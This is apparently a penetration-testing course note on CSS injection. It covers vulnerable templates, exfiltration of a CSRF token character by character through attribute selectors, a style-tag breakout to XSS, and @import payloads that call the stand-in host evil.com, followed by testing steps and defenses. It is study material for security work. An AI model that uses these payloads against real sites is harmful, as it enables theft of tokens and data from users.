---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.05 CSS Injection"
---

# 10.05 — CSS Injection

## What is CSS Injection?

CSS Injection occurs when user input is embedded into CSS without proper sanitization, allowing attackers to inject malicious CSS rules. While CSS cannot execute JavaScript directly in modern browsers, it can exfiltrate data, manipulate page layout, and in some cases bypass CSP.

*Note: This covers CSS injection as an injection attack. For CSS as an XSS vector, see [[09 - XSS in CSS Context]].*

```
VULNERABLE CODE:
  <style>
    .element { color: USER_INPUT; }
  </style>
  
ATTACK:
  USER_INPUT = red; background: url('https://evil.com/steal')
  RESULT:
  <style>
    .element { color: red; background: url('https://evil.com/steal'); }
  </style>
  → Request sent to attacker server!
```

---

## CSS-Based Data Exfiltration

```css
/* STEAL CSRF TOKEN CHARACTER BY CHARACTER: */
/* Uses CSS attribute selectors + background image requests */

/* If CSRF is in an input[value]: */
input[name="csrf"][value^="a"] { background: url('https://evil.com/t?c=a'); }
input[name="csrf"][value^="b"] { background: url('https://evil.com/t?c=b'); }
/* ... for each character */

/* ATTACKER GENERATES THIS AUTOMATICALLY: */
/* When CSS is injected, browser renders the page, */
/* matching selector fires, background loads, */
/* attacker receives the request → knows the prefix! */

/* STEP BY STEP EXTRACTION: */
/* Round 1: find first char */
/* Round 2: [value^="correct_char+next_char"] */
/* → Full token revealed character by character! */
```

---

## CSS Injection Payloads

```css
/* CLOSE STYLE BLOCK AND INJECT NEW HTML: */
INJECT: </style><script>alert(1)</script>

/* INJECT NEW CSS RULES: */
INJECT: red; } .admin-panel { display: block !important; }
/* → Makes hidden admin panel visible! */

/* INJECT POSITION OVERLAY: */
INJECT: red; } body::before { content: "YOU HAVE BEEN HACKED"; font-size: 100px; }

/* DATA EXFILTRATION: */
INJECT: red; } a[href*="secret"] { background: url('https://evil.com/found'); }
/* → Request fires if any link contains "secret"! */

/* LINK HIJACKING: */
INJECT: red; } a { color: blue !important; href: "https://evil.com"; }
/* Note: href in CSS doesn't work but can change visual appearance */
```

---

## @import SSRF

```css
/* CSS @import CAN LOAD EXTERNAL STYLESHEETS: */
INJECT: @import url('https://evil.com/evil.css');
/* → Browser fetches evil.css from attacker's server! */
/* → CSS exfiltration payload in evil.css fires! */

/* INTERNAL SSRF (if victim browser can reach internal): */
@import url('https://intranet.company.com/internal.css');
/* → May trigger requests to internal resources! */
```

---

## Testing CSS Injection

```bash
# STEP 1: IDENTIFY CSS CONTEXT:
# Submit canary and view source:
?color=red
# Source: .element { color: red; } → CSS CONTEXT!

# STEP 2: INJECT NEW PROPERTY:
?color=red;background:url(https://your-interactsh.com/test)
# Check Interactsh for incoming request → injection confirmed!

# STEP 3: TRY CLOSE STYLE TAG:
?color=</style><img src=x onerror=alert(1)>
# If alert fires → escalated to XSS!
```

---

## Defense

```
WHITELIST CSS VALUES:
  Only allow: color names, hex codes, rgb() values
  Regex: ^(#[0-9a-fA-F]{3,6}|[a-zA-Z]+|rgb\(\d+,\d+,\d+\))$
  
ENCODE IN CSS CONTEXT:
  Encode: ; } { @ \ characters

CSP:
  Content-Security-Policy: style-src 'self'
  → Blocks external stylesheet loads (@import)
  
  But: 'unsafe-inline' must NOT be present for style-src
  → Otherwise CSS injection works even with CSP!
```

---

## Related Notes
- [[09 - XSS in CSS Context]] — CSS as XSS vector
- [[15 - CSP Bypass for XSS]] — CSS and CSP
- [[07 - HTTP Header Injection]] — header injection
